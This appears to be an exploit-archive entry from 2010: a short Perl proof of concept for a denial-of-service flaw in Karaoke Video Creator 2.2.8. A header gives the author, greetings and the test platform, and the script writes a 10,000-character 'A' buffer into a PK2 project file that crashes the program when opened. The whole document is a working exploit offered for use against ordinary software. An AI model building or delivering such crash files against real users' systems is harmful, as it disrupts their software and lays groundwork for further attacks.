# Exploit Title: Karaoke Video Creator Denial of Service Vulnerability
# Author: PASSEWORD
# Date: 2010-08-20
# Software Link: http://www.powerkaraoke.com/src/prod-karaoke-video-creator.php
# Version : 2.2.8
# Greetz 2 : d4rk-h4ck3r , And All Muslims And Tunisian Hackers
# Tested on: Windows XP SP3 Fr

$buff="A" x 10000;
open (myfile , ">>PASS.PK2");
print myfile $buff;
close (myfile);
